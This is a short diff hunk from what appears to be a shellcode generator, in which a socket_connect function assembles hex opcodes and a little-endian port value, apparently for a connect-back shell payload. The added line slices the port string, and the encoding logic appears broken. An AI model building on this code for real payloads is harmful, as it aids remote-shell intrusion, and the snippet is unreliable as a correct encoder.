@@ -226,6 +226,7 @@ def socket_connect(ip, port):
 
     #print(PAYLOAD)
     port = hex(socket.htons(int(port)))[:2]
+    port = str(port[-2:])
 
     add_string += "566668" # push
     add_string += port[2:] + port[:2] # little endian    
